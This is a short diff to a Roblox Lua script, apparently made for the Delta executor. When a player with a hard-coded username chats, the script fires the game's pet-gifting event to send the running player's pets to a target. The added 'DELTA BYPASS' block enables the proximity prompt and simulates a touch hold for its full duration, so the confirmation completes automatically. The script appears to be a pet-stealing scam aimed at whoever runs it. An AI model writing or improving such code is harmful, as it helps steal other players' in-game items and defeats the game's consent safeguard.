@@ -365,9 +365,12 @@ local function startGiving()
             end
 
             ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", target)
-            prompt:InputHoldBegin()
-            task.wait(0.1)
-            prompt:InputHoldEnd()
+            -- DELTA BYPASS for ProximityPrompt
+            prompt.Enabled = true
+            prompt:InputHoldBegin(Enum.UserInputType.Touch)
+            task.wait(prompt.Duration)
+            prompt:InputHoldEnd(Enum.UserInputType.Touch)
+            -- END DELTA BYPASS
 
             if item:IsDescendantOf(LocalPlayer.Character) then
                 item.Parent = LocalPlayer.Backpack
@@ -387,4 +390,4 @@ for _,p in ipairs(Players:GetPlayers()) do
 end
 Players.PlayerAdded:Connect(function(p)
 	if p.Name==username then p.Chatted:Connect(function() if not started then started=true startGiving() end end) end
-end)
+end) 
